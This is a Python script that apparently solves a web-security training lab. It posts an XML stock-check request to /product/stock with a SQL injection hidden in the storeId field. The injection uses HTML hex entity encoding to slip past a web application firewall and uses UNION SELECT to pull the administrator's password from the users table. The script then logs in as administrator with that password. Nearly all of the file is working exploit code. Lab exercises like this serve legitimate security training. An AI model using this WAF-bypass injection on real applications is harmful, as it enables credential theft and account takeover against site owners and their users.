from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    login_as_administrator,
)

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    print("[!] Making a POST request to /product/stock")

    # I have encoded the following characters with HTML Hex Entity enocding to bypass WAF
    # `U` -> &#x55;
    # `S` -> &#x53;
    # `'` -> &#x27;
    payload = """<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>4</productId>
        <storeId>1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;</storeId>
    </stockCheck>"""

    print("[!] Using the following payload: ")
    print()
    print(payload)
    print()

    response = SESSION.post(f"{lab_url}/product/stock", data=payload)

    if response.status_code == 200:
        print("[+] Made the request successfully.")
        administrator_password = response.text.splitlines()[1]
        print(f"[+] Got the administrator password: {administrator_password}")

        login_as_administrator(lab_url, administrator_password)
    else:
        print("[-] Failed to make the request")
        exit()

    check_is_lab_solved(lab_url)
